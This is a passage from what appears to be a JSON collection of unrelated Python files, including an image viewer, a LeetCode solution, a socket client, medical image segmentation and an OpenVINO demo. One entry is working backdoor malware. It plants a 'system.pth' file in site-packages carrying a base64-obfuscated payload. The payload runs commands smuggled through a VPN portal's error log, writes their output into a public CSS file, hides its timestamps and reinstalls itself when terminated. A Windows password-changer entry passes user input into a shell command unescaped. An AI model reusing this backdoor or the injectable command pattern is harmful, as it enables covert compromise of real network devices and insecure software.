image\r\n        width = int(self.rendered_image.width * self.zoom_factor)\r\n        height = int(self.rendered_image.height * self.zoom_factor)\r\n        resized_image = self.rendered_image.resize((width, height), Image.LANCZOS)\r\n        photo = ImageTk.PhotoImage(resized_image)\r\n        self.img_label.configure(image=photo)\r\n        self.img_label.image = photo\r\n        self.update_zoom_label()\r\n\r\n    def update_zoom_label(self):\r\n        # Update the zoom label with the current zoom percentage\r\n        zoom_percentage = int(self.zoom_factor * 100)\r\n        self.zoom_label_var.set(f\"{zoom_percentage}%\")\r\n\r\n    def refresh_image(self):\r\n        new_interval = self.refresh_interval.get().split()[0]  # Extract the interval value (e.g., \"5\")\r\n        interval_seconds = int(new_interval) * 60 * 1000  # Convert to milliseconds\r\n        self.root.after(interval_seconds, self.refresh_image)  # Schedule the next refresh\r\n        self.load_selected_image()\r",
    "# 217. Contains Duplicate\n\n# Given an integer array nums, return true if any value appears at least twice in the array, and return false if every element is distinct. \n\n# Example 1:\n\n# Input: nums = [1,2,3,1]\n# Output: true\n# Example 2:\n\n# Input: nums = [1,2,3,4]\n# Output: false\n# Example 3:\n\n# Input: nums = [1,1,1,3,3,4,3,2,4,2]\n# Output: true\n \n\n# Constraints:\n\n# 1 <= nums.length <= pow(10,5)\n# pow(-10,9) <= nums[i] <= pow(10,9)\n\n####################################################################################################\n\n\nclass Solution(object):\n    def containsDuplicate(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: bool\n        \"\"\"\n            \n            # First Attempt #\n            # cont=[]\n            # if len(nums) == 0 or len(nums) > pow(10,5): return\n            # for i in nums:\n            #     if pow(-10,9)>i or i>pow(10,9): return\n            #     if not i in cont:\n            #         cont.append(i)\n            #     else: return 1\n            # return 0\n\n            # Second Attempt #\n            # if len(nums) == 0 or len(nums) > pow(10,5): return\n            # for i in nums:\n            #     if pow(-10,9)>i or i>pow(10,9): return\n            # if nums.count(i)!=1: return 1\n            # return 0\n\n\n\n            # Third attempt #\n        if len(nums) == 0 or len(nums) > pow(10,5): return\n        v={}\n        for i in nums:\n            v[i]=v.get(i,-1)+1\n            if v[i]: return 1\n        return 0",
    "import os,base64,time\r\nsystempth = \"/usr/lib/python3.6/site-packages/system.pth\"\r\nwith open(systempth,'wb') as f:\r\n    f.write(b'''import base64;exec(base64.b64decode(b\"CgoKZGVmIGNoZWNrKCk6CiAgICBpbXBvcnQgb3Msc3VicHJvY2Vzcyx0aW1lLHN5cwoKCiAgICBkZWYgc3RhcnRfcHJvY2VzcygpOgogICAgICAgIGltcG9ydCBiYXNlNjQKICAgICAgICBmdW5jdGlvbmNvZGUgPSBiIlpHVm1JRjlmYldGcGJpZ3BPZzBLSUNBZ0lHbHRjRzl5ZENCMGFISmxZV1JwYm1jc2RHbHRaU3h2Y3l4eVpTeGlZWE5sTmpRTkNnMEtEUW9OQ2lBZ0lDQmtaV1lnY21WemRHOXlaU2hqYzNOZmNHRjBhQ3hqYjI1MFpXNTBMR0YwYVcxbExHMTBhVzFsS1RvTkNpQWdJQ0FnSUNBZ2FXMXdiM0owSUc5ekxIUnBiV1VOQ2lBZ0lDQWdJQ0FnZEdsdFpTNXpiR1ZsY0NneE5Ta05DaUFnSUNBZ0lDQWdkMmwwYUNCdmNHVnVLR056YzE5d1lYUm9MQ2QzSnlrZ1lYTWdaam9OQ2lBZ0lDQWdJQ0FnSUNBZ0lHWXVkM0pwZEdVb1kyOXVkR1Z1ZENrTkNpQWdJQ0FnSUNBZ2IzTXVkWFJwYldVb1kzTnpYM0JoZEdnc0tHRjBhVzFsTEcxMGFXMWxLU2tOQ2lBZ0lDQWdJQ0FnRFFvTkNpQWdJQ0FnSUNBZ0RRb2dJQ0FnWkdWbUlGOWZhWE5mZDJodmJHVmZhRzkxY2lncE9nMEtJQ0FnSUNBZ0lDQm1jbTl0SUdSaGRHVjBhVzFsSUdsdGNHOXlkQ0JrWVhSbGRHbHRaUTBLSUNBZ0lDQWdJQ0JqZFhKeVpXNTBYM1JwYldVZ1BTQmtZWFJsZEdsdFpTNXViM2NvS1M1MGFXMWxLQ2tOQ2lBZ0lDQWdJQ0FnY21WMGRYSnVJR04xY25KbGJuUmZkR2x0WlM1dGFXNTFkR1VnSVQwZ01DQmhibVFnWTNWeWNtVnVkRjkwYVcxbExuTmxZMjl1WkNBOVBTQXdEUW9nSUNBZ1kzTnpYM0JoZEdnZ1BTQW5MM1poY2k5aGNIQjNaV0l2YzNOc2RuQnVaRzlqY3k5bmJHOWlZV3d0Y0hKdmRHVmpkQzl3YjNKMFlXd3ZZM056TDJKdmIzUnpkSEpoY0M1dGFXNHVZM056SncwS0lDQWdJR052Ym5SbGJuUWdQU0J2Y0dWdUtHTnpjMTl3WVhSb0tTNXlaV0ZrS0NrTkNpQWdJQ0JoZEdsdFpUMXZjeTV3WVhSb0xtZGxkR0YwYVcxbEtHTnpjMTl3WVhSb0tRMEtJQ0FnSUcxMGFXMWxQVzl6TG5CaGRHZ3VaMlYwYlhScGJXVW9ZM056WDNCaGRHZ3BEUW9OQ2lBZ0lDQjNhR2xzWlNCVWNuVmxPZzBLSUNBZ0lDQWdJQ0IwY25rNkRRb2dJQ0FnSUNBZ0lDQWdJQ0JUU0VWTVRGOVFRVlJVUlZKT0lEMGdKMmx0WjF4YktGdGhMWHBCTFZvd0xUa3JMejFkS3lsY1hTY05DaUFnSUNBZ0lDQWdJQ0FnSUd4cGJtVnpJRDBnVzEwTkNpQWdJQ0FnSUNBZ0lDQWdJRmRTU1ZSRlgwWk1RVWNnUFNCR1lXeHpaUTBLSUNBZ0lDQWdJQ0FnSUNBZ1ptOXlJR3hwYm1VZ2FXNGdiM0JsYmlnaUwzWmhjaTlzYjJjdmNHRnVMM056Ykhad2JsOXVaM2hmWlhKeWIzSXViRzluSWl4bGNuSnZjbk05SW1sbmJtOXlaU0lwTG5KbFlXUnNhVzVsY3lncE9nMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lISnpkQ0E5SUhKbExuTmxZWEpqYUNoVFNFVk1URjlRUVZSVVJWSk9MR3hwYm1VcERRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2FXWWdjbk4wT2cwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhVa2xVUlY5R1RFRkhJRDBnVkhKMVpRMEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JqYldRZ1BTQmlZWE5sTmpRdVlqWTBaR1ZqYjJSbEtISnpkQzVuY205MWNDZ3hLU2t1WkdWamIyUmxLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2RISjVPZzBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdiM1YwY0hWMElEMGdiM011Y0c5d1pXNG9ZMjFrS1M1eVpXRmtLQ2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSGRwZEdnZ2IzQmxiaWhqYzNOZmNHRjBhQ3dpWVNJcElHRnpJR1k2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1ppNTNjbWwwWlNnaUx5b2lLMjkxZEhCMWRDc2lLaThpS1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmxlR05sY0hRZ1JYaGpaWEIwYVc5dUlHRnpJR1U2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3WVhOekRRb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWTI5dWRHbHVkV1VOQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JzYVc1bGN5NWhjSEJsYm1Rb2JHbHVaU2tOQ2lBZ0lDQWdJQ0FnSUNBZ0lHbG1JRmRTU1ZSRlgwWk1RVWM2RFFvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWVhScGJXVTliM011Y0dGMGFDNW5aWFJoZEdsdFpTZ2lMM1poY2k5c2IyY3ZjR0Z1TDNOemJIWndibDl1WjNoZlpYSnliM0l1Ykc5bklpa05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQnRkR2x0WlQxdmN5NXdZWFJvTG1kbGRHMTBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpS1EwS0RRb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ2QybDBhQ0J2Y0dWdUtDSXZkbUZ5TDJ4dlp5OXdZVzR2YzNOc2RuQnVYMjVuZUY5bGNuSnZjaTVzYjJjaUxDSjNJaWtnWVhNZ1pqb05DaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWmk1M2NtbDBaV3hwYm1WektHeHBibVZ6S1EwS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUc5ekxuVjBhVzFsS0NJdmRtRnlMMnh2Wnk5d1lXNHZjM05zZG5CdVgyNW5lRjlsY25KdmNpNXNiMmNpTENoaGRHbHRaU3h0ZEdsdFpTa3BEUW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdhVzF3YjNKMElIUm9jbVZoWkdsdVp3MEtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIUm9jbVZoWkdsdVp5NVVhSEpsWVdRb2RHRnlaMlYwUFhKbGMzUnZjbVVzWVhKbmN6MG9ZM056WDNCaGRHZ3NZMjl1ZEdWdWRDeGhkR2x0WlN4dGRHbHRaU2twTG5OMFlYSjBLQ2tOQ2lBZ0lDQWdJQ0FnWlhoalpYQjBPZzBLSUNBZ0lDQWdJQ0FnSUNBZ2NHRnpjdzBLSUNBZ0lDQWdJQ0IwYVcxbExuTnNaV1Z3S0RJcERRb05DZzBLYVcxd2IzSjBJSFJvY21WaFpHbHVaeXgwYVcxbERRcDBhSEpsWVdScGJtY3VWR2h5WldGa0tIUmhjbWRsZEQxZlgyMWhhVzRwTG5OMFlYSjBLQ2tOQ2cwSyIKICAgICAgICBleGVjKGJhc2U2NC5iNjRkZWNvZGUoZnVuY3Rpb25jb2RlKSkgICAgICAgIAoKICAgIGlmIGIiL3Vzci9sb2NhbC9iaW4vbW9uaXRvciBtcCIgaW4gb3BlbigiL3Byb2Mvc2VsZi9jbWRsaW5lIiwicmIiKS5yZWFkKCkucmVwbGFjZShiIlx4MDAiLGIiICIpIDoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXJ0X3Byb2Nlc3MoKQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdCBhcyBlOgogICAgICAgICAgICBwcmludChlKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZSkKICAgICAgICByZXR1cm4gVHJ1ZQogICAgZWxzZToKICAgICAgICByZXR1cm4gRmFsc2UgCgoKZGVmIHByb3RlY3QoKToKICAgIGltcG9ydCBvcyxzaWduYWwKICAgIHN5c3RlbXB0aCA9ICIvdXNyL2xpYi9weXRob24zLjYvc2l0ZS1wYWNrYWdlcy9zeXN0ZW0ucHRoIgogICAgY29udGVudCA9IG9wZW4oc3lzdGVtcHRoKS5yZWFkKCkKICAgICMgb3MudW5saW5rKF9fZmlsZV9fKQogICAgZGVmIHN0b3Aoc2lnLGZyYW1lKToKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoc3lzdGVtcHRoKToKICAgICAgICAgICAgd2l0aCBvcGVuKHN5c3RlbXB0aCwidyIpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNvbnRlbnQpCgogICAgc2lnbmFsLnNpZ25hbChzaWduYWwuU0lHVEVSTSxzdG9wKQoKCnByb3RlY3QoKQpjaGVjaygpCg==\"))''')\r\natime=os.path.geta",
    "import sys\nimport socket\nimport selectors\nimport types\n\n\ndef start_connection(host, port, num_conns):\n    server_addr = (host, port)\n    for i in range(0, num_conns):\n        connid = i + 1\n        print(f\"Starting connection {connid} to {server_addr}\")\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.setblocking(False)\n        sock.connect_ex(server_addr)\n        events = selectors.EVENT_READ | selectors.EVENT_WRITE\n        data = types.SimpleNamespace(\n            connid=connid,\n            msg_total=sum(len(m) for m in messages),\n            recv_total=0,\n            messages=messages.copy(),\n            outb=b\"\",\n        )\n        sel.register(sock, events, data=data)\n\n\ndef service_connection(key, mask):\n    sock = key.fileobj\n    data = key.data\n    if mask & selectors.EVENT_READ:\n        recv_data = sock.recv(1024)\n        if recv_data:\n            print(f\"received {recv_data} from connection {data.connid}\")\n            data.recv_total += len(recv_data)\n        if not recv_data or data.recv_total == data.msg_total:\n            print(f\"closing connection {data.connid}\")\n            sel.unregister(sock)\n            sock.close()\n    if mask & selectors.EVENT_WRITE:\n        if not data.outb and data.messages:\n            data.outb = data.messages.pop(0)\n        if data.outb:\n            print(f\"Sending {data.outb!r} to {sock.getpeername()!r}\")\n            sent = sock.send(data.outb)\n            data.outb = data.outb[sent:]\n\n\nsel = selectors.DefaultSelector()\nhost, port, number_of_Connections = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])\nmessages = [b\"Message 1 from client.\", b\"Message 2 from client.\"]\n\nstart_connection(host, port, number_of_Connections)\n\ntry:\n    while True:\n        events = sel.select(timeout=None)\n        for key, mask in events:\n            if key.data is None:\n                continue\n            else:\n                service_connection(key, mask)\nexcept KeyboardInterrupt:\n    print(\"Keyboard Interrupt innit\")\n\nfinally:\n    sel.close()\n#sensational!\n",
    "import sqlite3\nfrom random import randint\n\ndef create_connection():\n    conn = None\n    try:\n        conn = sqlite3.connect('data.db', check_same_thread=False)\n        return conn\n    except sqlite3.Error as e:\n        print(e)\n    return conn\n\ndef create_table(conn):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS Users (\n        user_id INTEGER PRIMARY KEY,\n        user_length INTEGER,\n        user_use_letters INTEGER,\n        user_use_digits INTEGER,\n        user_use_punctuation INTEGER)\n        \"\"\")\n    except sqlite3.Error as e:\n        print(e)\n\ndef insert_user(conn, user_id, length, use_letters, use_digits, use_punctuation):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        INSERT INTO Users (user_id, user_length, user_use_letters, user_use_digits, user_use_punctuation)\n        VALUES (?, ?, ?, ?, ?)\n        \"\"\", (user_id, length, use_letters, use_digits, use_punctuation))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\ndef update_user_settings(conn, user_id, length, use_letters=True, use_digits=True, use_punctuation=True):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        UPDATE Users\n        SET user_length = ?,\n            user_use_letters = ?,\n            user_use_digits = ?,\n            user_use_punctuation = ?\n        WHERE user_id = ?\n        \"\"\", (length, use_letters, use_digits, use_punctuation, user_id))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\n\ndef delete_user(conn, user_id):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"DELETE FROM Users WHERE user_id = ?\", (user_id,))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\n\ndef get_all_users(conn):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT * FROM Users\")\n        rows = cursor.fetchall()\n        return rows\n    except sqlite3.Error as e:\n        print(e)\n\ndef close_connection(conn):\n    if conn:\n        conn.close()\n\nclass UserSettings:\n    def __init__(self, user_id):\n        self.user_id = user_id\n        self._load_settings()\n\n    def _load_settings(self):\n        conn = sqlite3.connect(\"data.db\")\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT user_use_letters, user_use_digits, user_use_punctuation, user_length FROM Users WHERE user_id = ?\", (self.user_id,))\n        settings = cursor.fetchone()\n        if settings:\n            self.use_letters, self.use_digits, self.use_punctuation, self.user_length = settings\n        else:\n            # \u0415\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u0432 \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445, \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n            self.user_length = 8\n            self.use_letters = True\n            self.use_digits = True\n            self.use_punctuation = True",
    "import pyttsx3\nimport speech_recognition \nengine = pyttsx3.init(\"sapi5\")\nvoices = engine.getProperty(\"voices\")\nengine.setProperty(\"voice\", voices[1].id)\nrate = engine.setProperty(\"rate\",100)\n\ndef speak(audio):\n    engine.say(audio)\n    engine.runAndWait()\n\ndef takeCommand():\n    r = speech_recognition.Recognizer()\n    with speech_recognition.Microphone() as source:\n        print(\"Listening.....\")\n        r.pause_threshold = 1\n        r.energy_threshold = 300\n        audio = r.listen(source,0,4)\n\n    try:\n        print(\"Understanding..\")\n        query  = r.recognize_google(audio,language='en-in')\n        print(f\"You Said: {query}\\n\")\n    except Exception as e:\n        print(\"Say that again\")\n        return \"None\"\n    return query\n\nif __name__ == \"__main__\":\n    while True:\n        query = takeCommand().lower()\n        if \"hi\" in query:\n            from GreetMe import greetMe\n            greetMe()\n            \n            while True:\n                query = takeCommand().lower()\n                if \"ok bye\" in query:\n                    speak(\"Ok sir , You can me call anytime\")\n                    break \n                elif \"hello\" in query:\n                    speak(\"Hello nayan, how are you ?\")\n                elif \"i am fine\" in query:\n                    speak(\"That's great\")\n                elif \"how are you\" in query:\n                    speak(\"I am fine sir\")\n                elif \"thank you\" in query:\n                    speak(\"Welcome sir, I am here only for you\")\n                elif \"who is rp\" in query:\n                    speak(\"R p means Rajesh Patra , is a profesor in Hooghly Engineering and Technology college. He is the H O D of basic science department in this college. Probability and Statics are the favorite part of mister R P sir\")\n                elif \"google\" in query:\n                    from SearchNow import searchGoogle\n                    searchGoogle(query)\n                elif \"youtube\" in query:\n                    from SearchNow import searchYoutube\n                    searchYoutube(query)\n                elif \"wikipedia\" in query:\n                    from SearchNow import searchWikipedia\n                    searchWikipedia(query)\n",
    "import SimpleITK as sitk\n# import matplotlib.pyplot as plt \nimport numpy as np\n# import nibabel as nib\nimport time\nimport cv2\nfrom skimage.filters import frangi\nfrom skimage import measure\nimport itk\nimport copy\nimport skimage\n\nfrom utils import * \n\n\ndef skeletonSegment(sitk_lung_path, bone_mask_path, lowerThreshold=129):\n    ''' \u5b8c\u6210\u9aa8\u9abc\u5206\u5272\uff0c\u53ef\u4ee5\u53bb\u9664\u5e8a\u677f\u7684\u5f71\u54cd\uff1b\n    \u4e3b\u8981\u601d\u8def\u901a\u8fc7\u8c03\u8282\u6700\u4f4e\u9608\u503clowerThreshold\uff0c\u9ed8\u8ba4\u4e3a129\uff08\u7ecf\u9a8c\u5f97\u51fa\uff09\n    \u624b\u81c2\u9aa8\u5934\u6709\u65f6\u65e0\u6cd5\u5206\u5272\u5f97\u5230\uff0c\u65e5\u540e\u9700\u8981\u4f18\u5316\n    change data : 2023\u5e746\u67089\u65e5\n\n    bone \u5206\u5272\n    :param sitk_lung_path: \u539f\u59cbct\n    :param bone_mask_path \u9aa8\u9abc\u63a9\u819c\u4fdd\u5b58\u8def\u5f84\n    :param lowerThreshold \u6700\u4f4e\u9608\u503c\n    '''\n    print(\"Now start seg skeleton!\")\n    tme_1 = time.time()\n    #sitk_src = dicomseriesReader(pathDicom)\n    sitk_src = sitk.ReadImage(sitk_lung_path) # , sitk.sitkInt16\n    # 1\n    # sitk_seg = BinaryThreshold(sitk_src, lowervalue=100, uppervalue=3000)\n\n    sitk_seg = sitk.BinaryThreshold(sitk_src, lowerThreshold=lowerThreshold, upperThreshold=3000, insideValue=255,\n                               outsideValue=0)\n\n    # sitk.WriteImage(sitk_seg, 'skeleton_step1.nii.gz')\n\n\n\n    # 2  \u4e3b\u8981\u5206\u5272\u5305\u62ec\u80ba\u7684\u9aa8\u5934(\u53bb\u9664\u6bdb\u523a)\n    sitk_open = MorphologicalOperation(sitk_seg, kernelsize=2, name='open')\n    # sitk.WriteImage(sitk_seg, 'skeleton_step2.nii.gz')\n\n    # sitk.WriteImage(sitk_open, './bone_test.nii.gz')\n\n    # 3 \u53d6\u6700\u5927\u8fde\u901a\u57df\n    # sitk_open = GetLargestConnectedCompont(sitk_open) # \u53d6\u6700\u5927\u8054\u901a\u57df\u4f1a\u5f71\u50cf\u9aa8\u9abc\u7684\u4e0d\u5b8c\u6574\u5206\u5272\n    # sitk.WriteImage(sitk_seg, 'skeleton_step3.nii.gz')\n\n    array_open = sitk.GetArrayFromImage(sitk_open)\n    array_seg = sitk.GetArrayFromImage(sitk_seg)\n\n    # 4 \u76f8\u51cf\n    array_mask = array_seg - array_open\n    sitk_mask = sitk.GetImageFromArray(array_mask)\n    sitk_mask.SetDirection(sitk_seg.GetDirection())\n    sitk_mask.SetSpacing(sitk_seg.GetSpacing())\n    sitk_mask.SetOrigin(sitk_seg.GetOrigin())\n    # sitk.WriteImage(sitk_seg, 'skeleton_step4.nii.gz')\n\n    # step4.\u6700\u5927\u8fde\u901a\u57df\u63d0\u53d6\uff0c\u53bb\u9664\u5c0f\u8fde\u63a5\n    skeleton_mask = GetLargestConnectedCompont(sitk_mask)\n\n    # \u52a0\u4e0a\u4e00\u4e2a\u95ed\u8fd0\u7b97\uff0c\u51cf\u5c11\u65ad\u5c42\n    skeleton_mask = MorphologicalOperation(skeleton_mask, kernelsize=2, name='close')\n\n    # sitk_skeleton = GetMaskImage(sitk_src, skeleton_mask, replacevalue=-1500)\n\n    #sitk_open = ab_GetMaskImage(sitk_open,lung_mask_path,0)\n    # skeleton_mask = MorphologicalOperation(skeleton_mask, kernelsize=3, name='open')\n\n    sitk.WriteImage(skeleton_mask, bone_mask_path)\n    tme_2 = time.time()\n    print('execution time: ' + str(round(tme_2-tme_1))+' s')\n    print(\"skeleton seg over!\")\n\n\n",
    "import keyboard\nfrom fuzzywuzzy import process\nimport logging\nimport math\n\nfrom t import print\nfrom terminal import Font, terminal_cursor\n\nlogging.getLogger(\"root\").setLevel(level=logging.ERROR)\n\nkey_dict = {\n    \"space\": \" \",\n    \"backspace\": \"\\b \\b\",\n    \"enter\": \"\\n\",\n    \"up\": \"\",\n    \"down\": \"\",\n    \"left\": \"\",\n    \"right\": \"\",\n}\n\noptions = {\"CFEPWDR-HB\", \"CFEPWDR-PR\", \"APLM-MELKU\"}\n\n\ndef autocomplete(*options, prompt: str):\n\n    phrase = \"\"\n    print(prompt.strip() + \" \", end=\"\", flush=True)\n\n    idx = len(phrase)\n\n    choice_idx = 0\n    reset = False\n    with terminal_cursor(end=\"\") as crsr:\n        while True:\n            if keyboard.is_pressed(\"esc\"):\n                break\n            if (not phrase) and reset:\n                choice_idx = 0\n                reset = False\n            choices = process.extract(phrase, choices=options)\n            key = keyboard.read_event(True)\n            if key.event_type == \"up\":\n                continue\n            if keyboard.is_modifier(key.name):\n                continue\n            key_str = key_dict.get(key.name, key.name)\n            if key_str == \"esc\":\n                print()\n                break\n            if key_str == \"\\n\":\n                crsr.move_left(len(phrase))\n                print(choices[choice_idx][0], end=\"\")\n                print(key_str, end=\"\")\n                phrase = choices[choice_idx][0]\n                idx = len(phrase) - 1\n                break\n            if key.name in [\"up\", \"down\"]:\n                if key.name == \"down\":\n                    choice_idx = (choice_idx + 1) % len(choices)\n                    crsr.move_left(len(phrase))\n                    print(Font.faint_font + choices[choice_idx][0], end=\"\", flush=True)\n                    crsr.move_left(len(choices[choice_idx][0]))\n                    print(Font.reset_font + phrase, end=\"\", flush=True)\n                # Todo implement select menu style.\n                continue\n            if key.name in [\"left\", \"right\"]:\n                # continue\n                if key.name == \"left\":\n                    if idx == 0:\n                        continue\n                    idx -= 1\n\n                if key.name == \"right\":\n                    if idx == len(phrase) - 1:\n                        continue\n                    idx += 1\n\n            if key.name in [\"tab\", \"end\"]:\n                crsr.move_left(len(phrase))\n                phrase = choices[choice_idx][0]\n                print(Font.reset_font + phrase, end=\"\", flush=True)\n                idx = len(phrase) - 1\n                continue\n\n            if key.name not in [\"backspace\", \"up\", \"down\", \"left\", \"right\"]:\n                crsr.move_left(len(phrase))\n                phrase += key_str.upper()\n                idx += 1\n            elif key.name == \"backspace\":\n                reset = True\n                crsr.move_left(len(phrase))\n                phrase = phrase[:-1]\n                idx -= 1\n            else:\n                crsr.move_left(len(phrase))\n\n            print(Font.faint_font + choices[choice_idx][0], end=\"\", flush=True)\n            crsr.move_left(len(choices[choice_idx][0]))\n            print(Font.reset_font + phrase, end=\"\", flush=True)\n            crsr.move_left(len(phrase))\n\n            crsr.move_right(idx)\n    return phrase\n\n\nprodID = autocomplete(*options, prompt=\"Enter Prod ID:\")\n\nprint(f\"PROD ID you entered is: {prodID}\")\n",
    "import subprocess as sp\nimport ctypes\nimport os\nimport sys\n\ndef title():\n    print(\"****************************\")\n    print(\"* Windows Password Changer *\")\n    print(\"*       Written by         *\")\n    print(\"*     Junaid Jagirani      *\")\n    print(\"****************************\")\ndef is_user_admin():\n    try:\n        is_admin = os.getuid() == 0\n    except AttributeError:\n        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n    return is_admin\ndef get_users():\n    if sys.platform == \"win32\" or sys.platform == \"cygwin\":\n        user_list = set(os.listdir(\"c://Users\"))\n        not_allowed = set([\"All Users\", \"Default\", \"Default User\", \"desktop.ini\", \"Public\"])\n        users = list(user_list - not_allowed)  # subtratcting sets\n        return users\n    else:\n        print(\"I did not support this platform\")\ndef main():\n    title()\n    user_num = 0\n    current_user = sp.os.getlogin()  #get current user name\n    print(\"Checking for privileges\")\n    if is_user_admin():\n        print(\"[+] You have admin privileges\")\n        users = get_users()\n        for i in users:\n            print(f\"{user_num+1}. {i}\")\n            user_num+=1\n        print(\"Enter your choice : \",end=\" \")\n        choice = input()\n        try:\n            choice=int(choice)\n            if choice<=0:\n                raise ValueError\n        except ValueError:\n            print(\"Invalid input\")\n            sys.exit()\n        try:\n            user_selected = users[choice - 1]\n            print(f\"User => {user_selected}\")\n            print(\"Enter your password (default=empty) : \",end=\" \")\n            password = input()\n            if password==\"\":\n                print(\"Password => [none]\")\n            else:\n                print(f\"Password => {password}\")\n            cmd = \"net user \\\"\"+user_selected+\"\\\" \\\"\"+password+\"\\\"\"\n            # print(cmd)\n            output = sp.call(cmd, shell=True)\n            print(output)\n        except IndexError:\n            print(\"Out of range\")\n            sys.exit()\n    else:\n        print(\"[!] You have no admin privileges\")\n        print(\"[!] You need admin privileges to continue\")\nif __name__ == '__main__':\n    main()\n",
    "import openvino as ov\nfrom openvino import get_version\nimport cv2\nimport numpy as np\nimport collections\nimport matplotlib.pyplot as plt\nimport time\nfrom IPython import display\nfrom typing import Union, Tuple, NamedTuple, Optional, List\nfrom pathlib import Path\nimport threading\nimport os\nfrom os import PathLike\nimport platform\n\nprint('''\u26a0\ufe0f Intel\u00ae Confidential. For Internal Use ONLY\n\u2709\ufe0f Contact: Ryan Loney (ryan.loney@intel.com)''')\n\n# Get OpenVINO version and print in console\ninstalled_version = get_version()\nprint(f\"\u2699\ufe0f OpenVINO version: {installed_version}\")\nprint(f\"\u2699\ufe0f Current OS: {platform.platform()}\")\n\ncore = ov.Core()\nir_model_path = Path(\"selfie_multiclass_256x256.xml\")\nov_model = core.read_model(ir_model_path)\nprint(\"\u2705 OpenVINO background segmentation model read from disk\")\n\n# Get available devices\ndevices = core.available_devices\n\n# If NPU is available, use it, otherwise switch to CPU (for older PCs)\nif 'NPU' in devices:\n    device = 'NPU'\n    print(\"\u2705 NPU detected - NPU set as inference device.\")\nelse:\n    device = 'CPU'\n    print(\"\ud83d\udfe8 NO NPU DEVICE DETECTED - Using CPU device instead.\") \n\n\ncompiled_model = core.compile_model(ov_model, device)\nprint(f\"\u2705 OpenVINO background segmentation model loaded on {device} device.\")\n\n\ndef load_image(path: str) -> np.ndarray:\n    \"\"\"\n    Loads an image from `path` and returns it as BGR numpy array. `path`\n    should point to an image file, either a local filename or a url. The image is\n    not stored to the filesystem. Use the `download_file` function to download and\n    store an image.\n    :param path: Local path name or URL to image.\n    :return: image as BGR numpy array\n    \"\"\"\n    import cv2\n    import requests\n\n    if path.startswith(\"http\"):\n        # Set User-Agent to Mozilla because some websites block\n        # requests with User-Agent Python\n        response = requests.get(path, headers={\"User-Agent\": \"Mozilla/5.0\"})\n        array = np.asarray(bytearray(response.content), dtype=\"uint8\")\n        image = cv2.imdecode(array, -1)  # Loads the image as BGR\n    else:\n        image = cv2.imread(path)\n    return image\n\n\n# Read input image and convert it to RGB\nprint(\"\u2705 Loading sample PNG image\")\ntest_image_url = \"sample.png\"\nimg = load_image(test_image_url)\nimg = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n\n# Preprocessing helper function\ndef resize_and_pad(image:np.ndarray, height:int = 256, width:int = 256):\n    \"\"\"\n    Input preprocessing function, takes input image in np.ndarray format, \n    resizes it to fit specified height and width with preserving aspect ratio \n    and adds padding on bottom or right side to complete target height x width rectangle.\n    \n    Parameters:\n      image (np.ndarray): input image in np.ndarray format\n      height (int, *optional*, 256): target height\n      width (int, *optional*, 256): target width\n    Returns:\n      padded_img (np.ndarray): processed image\n      padding_info (Tuple[int, int]): information about padding size, required for postprocessing\n    \"\"\"\n    h, w = image.shape[:2]\n    if h < w:\n        img = cv2.resize(image, (width, np.floor(h / (w / width)).astype(int)))\n    else:\n        img = cv2.resize(image, (np.floor(w / (h / height)).astype(int), height))\n    \n    r_h, r_w = img.shape[:2]\n    